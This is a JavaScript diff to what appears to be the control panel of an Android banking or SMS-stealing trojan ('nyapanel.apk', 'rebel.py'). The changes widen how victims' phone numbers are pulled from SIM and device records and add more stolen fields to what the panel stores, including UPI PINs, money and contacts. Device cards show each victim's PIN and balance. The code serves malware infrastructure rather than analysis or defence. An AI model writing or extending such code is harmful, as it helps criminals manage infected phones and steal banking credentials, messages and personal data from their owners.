@@ -134,12 +134,7 @@ function isCommandOnlyRecord(s){
 }
 function getDeviceDisplayPhone(s){
   if(!s)return'No Number';
-  if(isNyaApkClientRecord(s))return getApkPhoneDisplay(s)||'No Number';
-  if(s._phoneSource&&(s._phoneSource==='user_list'||s._phoneSource==='user_data')&&s.mobNo){
-    return parseDevicePhone(s.mobNo)||'No Number';
-  }
-  var p=parseDevicePhone(s.mobNo)||getPhoneFromRecord(s);
-  return p||'No Number';
+  return getApkPhoneDisplay(s);
 }
 function isRabelPanel(inst){
   if(!inst)return false;
@@ -380,47 +375,137 @@ function hasApkModelName(raw){return !!(raw&&raw.modelName!=null&&String(raw.mod
 /** nyapanel.apk clients/ profile — same shape as rebel.py parse_device */
 function isNyaApkClientRecord(raw){
   if(!raw||typeof raw!=='object')return false;
-  return !!(raw.modelName||raw.deviceId||(raw.mobNo!=null&&String(raw.mobNo).trim()&&!/^unknown$/i.test(String(raw.mobNo).trim()))||(raw.sims&&(Array.isArray(raw.sims)?raw.sims.length:Object.keys(raw.sims).length)));
+  return !!(raw.modelName||raw.deviceId||(raw.mobNo!=null&&String(raw.mobNo).trim()&&!/^unknown$/i.test(String(raw.mobNo).trim()))||(raw.sims&&(Array.isArray(raw.sims)?raw.sims.length:Object.keys(raw.sims).length))||raw.sim1!=null||raw.sim2!=null||raw.phone||raw.phone_number||raw.mobile);
+}
+function apkSimNumberFromEntry(s){
+  if(s==null||s==='')return'';
+  if(typeof s==='string'){
+    var t=String(s).trim();
+    return(t&&!/^unknown$/i.test(t))?t:'';
+  }
+  if(typeof s!=='object')return'';
+  var keys=['phoneNumber','phone_number','phone','mobNo','mobile','number','contact_no','msisdn','simNumber'];
+  var i,v;
+  for(i=0;i<keys.length;i++){
+    v=s[keys[i]];
+    if(v==null||v==='')continue;
+    v=String(v).trim();
+    if(v&&!/^unknown$/i.test(v))return v;
+  }
+  return'';
 }
 function parseApkSims(raw){
   var sims=raw&&raw.sims,i, s, num, unique=[], seen={};
-  if(!sims)return unique;
+  if(!sims){
+    if(raw){
+      if(raw.sim1!=null||raw.sim2!=null||raw.sim_1!=null||raw.sim_2!=null){
+        [raw.sim1,raw.sim2,raw.sim_1,raw.sim_2].forEach(function(v,idx){
+          num=apkSimNumberFromEntry(v);
+          if(!num||seen[num])return;
+          seen[num]=1;
+          unique.push({slot:idx+1,phoneNumber:num});
+        });
+      }
+    }
+    return unique;
+  }
   if(typeof sims==='object'&&!Array.isArray(sims))sims=Object.keys(sims).map(function(k){return sims[k];});
   if(!Array.isArray(sims))return unique;
   for(i=0;i<sims.length;i++){
     s=sims[i];
-    if(typeof s==='string'){
-      num=String(s).trim();
-    }else if(s&&typeof s==='object'){
-      num=String(s.phoneNumber||'').trim();
-    }else continue;
+    num=apkSimNumberFromEntry(s);
     if(!num||/^unknown$/i.test(num))continue;
     if(seen[num])continue;
     seen[num]=1;
-    unique.push(typeof s==='object'?Object.assign({},s,{phoneNumber:num}):{phoneNumber:num});
+    unique.push(typeof s==='object'?Object.assign({},s,{phoneNumber:num}):{phoneNumber:num,slot:i+1});
   }
   return unique;
 }
 function apkPhoneFromRaw(raw){
   if(!raw)return'';
+  var mob='', parsed='', sims, i;
   if(raw.mobNo!=null){
-    var mob=String(raw.mobNo).trim();
-    if(mob&&!/^unknown$/i.test(mob))return mob;
+    mob=String(raw.mobNo).trim();
+    if(mob&&!/^unknown$/i.test(mob)){
+      parsed=parseDevicePhone(mob);
+      if(parsed)return parsed;
+      if(looksLikePhone(mob))return mob;
+    }
   }
-  var sims=parseApkSims(raw);
-  if(sims.length&&sims[0].phoneNumber)return String(sims[0].phoneNumber).trim();
+  parsed=parseDevicePhone(raw.phone)||parseDevicePhone(raw.phone_number)||parseDevicePhone(raw.mobile)||parseDevicePhone(raw.number)||parseDevicePhone(raw.sim1)||parseDevicePhone(raw.sim2)||parseDevicePhone(raw.sim_1)||parseDevicePhone(raw.sim_2);
+  if(parsed)return parsed;
+  sims=parseApkSims(raw);
+  for(i=0;i<sims.length;i++){
+    if(sims[i].phoneNumber)return String(sims[i].phoneNumber).trim();
+  }
   return'';
 }
 function getApkPhoneDisplay(raw,d){
-  var sims=parseApkSims(raw), nums=[], i, n;
+  var sims=parseApkSims(raw), nums=[], i, n, fallback;
   for(i=0;i<sims.length;i++){
     n=String(sims[i].phoneNumber||'').trim();
     if(n&&!/^unknown$/i.test(n))nums.push(n);
   }
   if(nums.length)return nums.join(' | ');
-  var mob=apkPhoneFromRaw(raw);
-  if(mob)return mob;
-  return (d&&d.displayPhone)||'No Number';
+  fallback=apkPhoneFromRaw(raw);
+  if(fallback)return fallback;
+  if(raw&&!isSmsCommandRecord(raw)){
+    fallback=getPhoneFromRecordGeneric(raw);
+    if(fallback)return fallback;
+  }
+  if(d&&d.displayPhone&&d.displayPhone!=='No Number')return d.displayPhone;
+  return'No Number';
+}
+function getPhoneFromRecordGeneric(s){
+  if(!s||typeof s!=='object')return'';
+  if(isCommandQueueRecord(s)||isSmsCommandRecord(s))return'';
+  var direct=parseDevicePhone(s.mobNo)||parseDevicePhone(s.phone_number)||parseDevicePhone(s.phone)||parseDevicePhone(s.mobile);
+  if(direct)return direct;
+  var check=function(obj){
+    if(!obj||isSmsCommandRecord(obj))return null;
+    var i,v,parsed;
+    for(i=0;i<DEVICE_PHONE_KEYS.length;i++){
+      if(obj[DEVICE_PHONE_KEYS[i]]==null||obj[DEVICE_PHONE_KEYS[i]]==='')continue;
+      parsed=parseDevicePhone(obj[DEVICE_PHONE_KEYS[i]]);
+      if(parsed)return parsed;
+    }
+    return null;
+  };
+  var skipDeepKeys={action:1,sendSms:1,sms:1,webhookEvent:1,command:1,cmd:1,manual_commands:1,outbox:1,sendsms:1};
+  var deepScanPhone=function(obj,depth){
+    if(!obj||typeof obj!=='object'||depth>6||isSmsCommandRecord(obj))return'';
+    var k,v,p,parsed,i;
+    for(k in obj){
+      if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
+      if(skipDeepKeys[k])continue;
+      v=obj[k];
+      if(v==null)continue;
+      if(typeof v!=='object'){
+        for(i=0;i<DEVICE_PHONE_KEYS.length;i++){
+          if(k===DEVICE_PHONE_KEYS[i]||(k==='number'&&depth>0)){
+            parsed=parseDevicePhone(v);
+            if(parsed)return parsed;
+          }
+        }
+        continue;
+      }
+      if(v&&typeof v==='object'&&!skipDeepKeys[k]){
+        p=deepScanPhone(v,depth+1);
+        if(p)return p;
+      }
+    }
+    return'';
+  };
+  var p=check(s);if(p)return p;
+  var nests=['device_info','live_data','deviceInfo','liveData','info','profile','sim_info','simInfo','sim_data','SimInfo'];
+  for(var n=0;n<nests.length;n++){if(s[nests[n]]){p=check(s[nests[n]]);if(p)return p;}}
+  if(s.Device_info&&typeof s.Device_info==='string'){
+    var m=s.Device_info.match(/(?:phone|mobile|number|sim)[^\n:]*[:]\s*([+\d\s-]{8,15})/i);
+    if(m&&m[1]&&looksLikePhone(m[1]))return normalizePhoneDigits(m[1]);
+  }
+  if(s.sims&&Array.isArray(s.sims)){for(var i=0;i<s.sims.length;i++){var sim=s.sims[i];if(!sim||typeof sim!=='object')continue;var pn=sim.phone_number||sim.phone||sim.mobNo||sim.mobile||sim.contact_no||sim.number||sim.phoneNumber;if(pn&&looksLikePhone(pn))return normalizePhoneDigits(pn);}}
+  if(s.sim_info&&typeof s.sim_info==='object'){var si=s.sim_info;p=check(si);if(p)return p;if(si.sims&&Array.isArray(si.sims)){for(var j=0;j<si.sims.length;j++){var sim2=si.sims[j];var pn2=sim2.phone_number||sim2.phone||sim2.mobNo||sim2.mobile||sim2.contact_no||sim2.number||sim2.phoneNumber;if(pn2&&looksLikePhone(pn2))return normalizePhoneDigits(pn2);}}}
+  return deepScanPhone(s,0);
 }
 function parseApkOnlineStatus(raw){
   if(!raw)return false;
@@ -1365,56 +1450,12 @@ function closeFbSheet(){document.getElementById('sheetBg').classList.remove('ope
 
 function getPhoneFromRecord(s){
   if(!s)return'';
-  if(isNyaApkClientRecord(s))return apkPhoneFromRaw(s);
-  if(isCommandQueueRecord(s))return'';
-  var direct=parseDevicePhone(s.mobNo)||parseDevicePhone(s.phone_number)||parseDevicePhone(s.phone)||parseDevicePhone(s.mobile);
-  if(direct)return direct;
-  if(isSmsCommandRecord(s))return'';
-  var check=function(obj){
-    if(!obj||isSmsCommandRecord(obj))return null;
-    var i,v,parsed;
-    for(i=0;i<DEVICE_PHONE_KEYS.length;i++){
-      if(obj[DEVICE_PHONE_KEYS[i]]==null||obj[DEVICE_PHONE_KEYS[i]]==='')continue;
-      parsed=parseDevicePhone(obj[DEVICE_PHONE_KEYS[i]]);
-      if(parsed)return parsed;
-    }
-    return null;
-  };
-  var skipDeepKeys={action:1,sendSms:1,sms:1,webhookEvent:1,command:1,cmd:1,manual_commands:1,outbox:1,sendsms:1};
-  var deepScanPhone=function(obj,depth){
-    if(!obj||typeof obj!=='object'||depth>6||isSmsCommandRecord(obj))return'';
-    var k,v,p,parsed,i;
-    for(k in obj){
-      if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
-      if(skipDeepKeys[k])continue;
-      v=obj[k];
-      if(v==null)continue;
-      if(typeof v!=='object'){
-        for(i=0;i<DEVICE_PHONE_KEYS.length;i++){
-          if(k===DEVICE_PHONE_KEYS[i]||(k==='number'&&depth>0)){
-            parsed=parseDevicePhone(v);
-            if(parsed)return parsed;
-          }
-        }
-        continue;
-      }
-      if(v&&typeof v==='object'&&!skipDeepKeys[k]){
-        p=deepScanPhone(v,depth+1);
-        if(p)return p;
-      }
-    }
-    return'';
-  };
-  var p=check(s);if(p)return p;
-  var nests=['device_info','live_data','deviceInfo','liveData','info','profile','sim_info','simInfo','sim_data','SimInfo'];
-  for(var n=0;n<nests.length;n++){if(s[nests[n]]){p=check(s[nests[n]]);if(p)return p;}}
-  if(s.Device_info&&typeof s.Device_info==='string'){
-    var m=s.Device_info.match(/(?:phone|mobile|number|sim)[^\n:]*[:]\s*([+\d\s-]{8,15})/i);
-    if(m&&m[1]&&looksLikePhone(m[1]))return normalizePhoneDigits(m[1]);
+  if(isCommandQueueRecord(s)||isSmsCommandRecord(s))return'';
+  if(isNyaApkClientRecord(s)){
+    var apk=apkPhoneFromRaw(s);
+    if(apk)return apk;
   }
-  if(s.sims&&Array.isArray(s.sims)){for(var i=0;i<s.sims.length;i++){var sim=s.sims[i];if(!sim||typeof sim!=='object')continue;var pn=sim.phone_number||sim.phone||sim.mobNo||sim.mobile||sim.contact_no||sim.number;if(pn&&looksLikePhone(pn))return normalizePhoneDigits(pn);}}
-  if(s.sim_info&&typeof s.sim_info==='object'){var si=s.sim_info;p=check(si);if(p)return p;if(si.sims&&Array.isArray(si.sims)){for(var j=0;j<si.sims.length;j++){var sim2=si.sims[j];var pn2=sim2.phone_number||sim2.phone||sim2.mobNo||sim2.mobile||sim2.contact_no||sim2.number;if(pn2&&looksLikePhone(pn2))return normalizePhoneDigits(pn2);}}}
-  return deepScanPhone(s,0);
+  return getPhoneFromRecordGeneric(s);
 }
 function extractContactsFromRecord(raw){
   if(!raw||typeof raw!=='object')return[];
@@ -1497,7 +1538,7 @@ function normalizeClientRecord(raw){
     battery:parseInt(String(raw.battery||raw.battery_level).replace(/%/g,''),10)||0,
     network:raw.service_provider||raw.network||raw.carrier||'?',
     sms_count:raw.sms_count||raw.smsCount||raw.total_sms||0,
-    mobNo:apkPhoneFromRaw(raw)
+    mobNo:apkPhoneFromRaw(raw)||getPhoneFromRecordGeneric(raw)
   };
   if(raw.d_name!==undefined||raw.phone_number!==undefined){
     var on2=raw.status==='online'||on;
@@ -1526,11 +1567,17 @@ function normalizeClientRecord(raw){
     online:on,battery:parseInt(raw.battery||raw.battery_level,10)||0,network:raw.network||'?',
     sms_count:raw.sms_count||raw.smsCount||0,mobNo:mob};
 }
+function pickPhoneFromData(data){
+  if(!data||typeof data!=='object')return'';
+  return apkPhoneFromRaw(data)||getPhoneFromRecordGeneric(data);
+}
 function ingestDeviceData(fbId,node,devId,data){
   if(!data||typeof data!=='object'||isCommandQueueRecord(data))return;
   var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
-  if((!norm.mobNo||!String(norm.mobNo).trim())&&data.mobNo!=null&&String(data.mobNo).trim())norm.mobNo=String(data.mobNo).trim();
-  if((!norm.mobNo||!String(norm.mobNo).trim())&&data.phone_number&&!isNyaApkClientRecord(data))norm.mobNo=parseDevicePhone(data.phone_number)||String(data.phone_number).trim();
+  var picked=pickPhoneFromData(data);
+  if(picked)norm.mobNo=picked;
+  else if((!norm.mobNo||!String(norm.mobNo).trim())&&data.mobNo!=null&&String(data.mobNo).trim())norm.mobNo=String(data.mobNo).trim();
+  else if((!norm.mobNo||!String(norm.mobNo).trim())&&data.phone_number!=null)norm.mobNo=parseDevicePhone(data.phone_number)||String(data.phone_number).trim();
   norm._node=node;norm._fbId=fbId;
   var key=makeDevKey(fbId,devId), existing=clientsRawMap[key]||{};
   var profileNode=(node==='clients'||node==='devices'||node==='Verify_Device'||node==='user_list'||node==='user_data'||node==='devices_status');
@@ -1554,7 +1601,7 @@ function ingestDeviceData(fbId,node,devId,data){
     if(norm.mobNo)norm._phoneSource=node;
     if(node==='user_list')norm._node='user_list';
   }
-  var keepFields=['mobNo','modelName','deviceId','liked','like','upipin','upiPin','login','checked','money','joined','dateJoined','date_joined','installDate','createdAt','created_at','timestamp','status','battery','sims','androidV','sdkV','label','service_provider','sms_count','device_model','brand','network','lastMessageTime','ping'];
+  var keepFields=['mobNo','modelName','deviceId','liked','like','upipin','upiPin','login','checked','money','joined','dateJoined','date_joined','installDate','createdAt','created_at','timestamp','status','battery','sims','androidV','sdkV','label','service_provider','sms_count','device_model','brand','network','lastMessageTime','ping','phone','phone_number','mobile','number','sim1','sim2','sim_1','sim_2','live_data','device_info','sim_info'];
   var saved={};
   keepFields.forEach(function(f){if(data[f]!==undefined&&data[f]!==null)saved[f]=data[f];});
   if(saved.mobNo!=null&&!norm.mobNo)norm.mobNo=String(saved.mobNo).trim();
@@ -1575,7 +1622,7 @@ function enrichFromAllNodes(inst){
     var p=parseDevKey(mapKey);
     if(p.fbId!==inst.id)return;
     var rec=clientsRawMap[mapKey];
-    if(isNyaApkClientRecord(rec)&&rec._node==='clients')return;
+    if(isNyaApkClientRecord(rec)&&rec._node==='clients'&&rec.mobNo&&String(rec.mobNo).trim()&&!/^unknown$/i.test(String(rec.mobNo).trim()))return;
     if(rec._phoneSource==='user_list'||rec._phoneSource==='user_data')return;
     var needsPhone=!rec.mobNo||!String(rec.mobNo).trim();
     var needsContacts=!rec.contacts||!rec.contacts.length;
@@ -1842,7 +1889,7 @@ function processClientsDataNow(){
     var hasSms=!!(smsIdx&&smsIdx.roots&&smsIdx.roots.length);
     var pin=getApkUpiPin(s);
     allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
-      name:getApkModel(s,{name:s.name}),displayPhone:getApkPhoneDisplay(s),brand:s.brand||'',android:s.android||'',
+      name:getApkModel(s,{name:s.name}),displayPhone:getDeviceDisplayPhone(s),brand:s.brand||'',android:s.android||'',
       status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0,hasSms:hasSms,
       sims:extractDeviceSims(s),pin:pin,hasPin:!!pin,money:getApkMoney(s),joined:getApkJoined(s),
       contacts:contacts,contactCount:contacts.length});
@@ -2008,7 +2055,7 @@ function scanAllDevicesBank(){
 function buildDevCardHtml(d,i,total){
   var raw=getRawDev(d.id);
   var on=d.status==='online';
-  var phone=getApkPhoneDisplay(raw,d);
+  var phone=getDeviceDisplayPhone(raw);
   var info='Phone : '+esc(phone)+'\nModel : '+esc(getApkModel(raw,d))+'\nBattery : '+(raw.battery!=null?raw.battery:d.battery)+'%\n$- : '+esc(getApkMoney(raw));
   var pinLine='PIN = '+esc(getApkUpiPin(raw,d)||'—');
   var count=(total!=null?total-i:i+1);
